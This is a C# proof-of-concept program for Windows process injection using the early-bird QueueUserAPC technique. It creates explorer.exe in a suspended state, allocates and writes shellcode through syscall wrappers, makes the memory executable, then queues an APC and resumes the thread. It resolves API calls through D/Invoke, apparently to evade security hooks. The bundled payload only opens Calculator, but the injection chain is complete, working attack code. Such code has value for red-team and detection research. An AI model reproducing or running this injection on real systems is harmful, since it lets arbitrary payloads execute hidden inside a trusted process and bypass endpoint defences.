using System;
using System.Runtime.InteropServices;

using PoCLibrary;
using static PoCLibrary.Win32;
using DInvoke.DynamicInvoke;
using Data = DInvoke.Data;

namespace QueueUserAPC_PoC
{
    internal class PoC
    {
        internal static void PopCalc()
        {
            bool isWindows = PoCHelpers.CheckValidOperatingSystem();
            if (!isWindows)
            {
                return;
            }

            byte[] shellcode;

            if (Environment.Is64BitProcess)
            {
                shellcode = Shellcode.Calc64;
            }
            else
            {
                shellcode = Shellcode.Calc32;
            }

            InjectShellcode(shellcode);
        }

        private static void InjectShellcode(byte[] shellcode)
        {
            var pi = CreateNewProcess();
            var regionSize = (IntPtr)shellcode.Length;

            var hMemory = Syscalls.AllocateMemory(pi.hProcess, regionSize);
            if (hMemory == IntPtr.Zero)
            {
                throw new Exception("Failed to allocate memory");
            }

            Console.WriteLine("hMemory: 0x{0:X}", hMemory.ToInt32());

            if (!Syscalls.WriteMemory(pi.hProcess, hMemory, shellcode))
            {
                throw new Exception("Failed to write memory");
            }

            if (!Syscalls.ProtectMemory(pi.hProcess, hMemory, regionSize))
            {
                throw new Exception("Failed to change memory to RX");
            }

            QueueUserAPC(pi, hMemory);

            CloseHandles(pi);
        }

        private static void CloseHandles(PROCESS_INFORMATION pi)
        {
            object[] parameters = new object[] { pi.hThread };

            // Close thread handle
            Generic.DynamicAPIInvoke(
                "kernel32.dll",
                "CloseHandle",
                typeof(CloseHandle),
                ref parameters);

            parameters = new object[] { pi.hProcess };

            // Close process handle
            Generic.DynamicAPIInvoke(
                "kernel32.dll",
                "CloseHandle",
                typeof(CloseHandle),
                ref parameters);
        }

        private static void QueueUserAPC(PROCESS_INFORMATION pi, IntPtr hMemory)
        {
            object[] parameters =
            {
                hMemory,    // point to the shellcode location
                pi.hThread, // primary thread of process
                (IntPtr)0
            };

            // Queue the APC
            Generic.DynamicAPIInvoke(
                "kernel32.dll",
                "QueueUserAPC",
                typeof(QueueUserAPC),
                ref parameters);

            parameters = new object[] { pi.hThread };

            // Resume the thread
            Generic.DynamicAPIInvoke(
                "kernel32.dll",
                "ResumeThread",
                typeof(ResumeThread),
                ref parameters);
        }

        private static PROCESS_INFORMATION CreateNewProcess()
        {
            var si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(si);

            var pa = new SECURITY_ATTRIBUTES();
            pa.nLength = Marshal.SizeOf(pa);

            var ta = new SECURITY_ATTRIBUTES();
            ta.nLength = Marshal.SizeOf(ta);

            var pi = new PROCESS_INFORMATION();

            var rootPath = @"C:\Windows\";
            var app = rootPath + "explorer.exe";

            object[] parameters =
            {
                app,
                null,
                ta,
                pa,
                false,
                (uint)Data.Win32.Advapi32.CREATION_FLAGS.CREATE_SUSPENDED,
                IntPtr.Zero,
                rootPath,
                si,
                pi
            };

            // Create the Process
            var success = (bool)Generic.DynamicAPIInvoke(
                "kernel32.dll",
                "CreateProcessW",
                typeof(CreateProcessW),
                ref parameters);

            if (success)
            {
                pi = (PROCESS_INFORMATION)parameters[9];
                Console.WriteLine("Process created with PID: {0}", pi.dwProcessId);
            }
            else
            {
                Console.WriteLine("Failed to create process. Error code: {0}.", Marshal.GetLastWin32Error());
            }

            return pi;
        }
    }
}
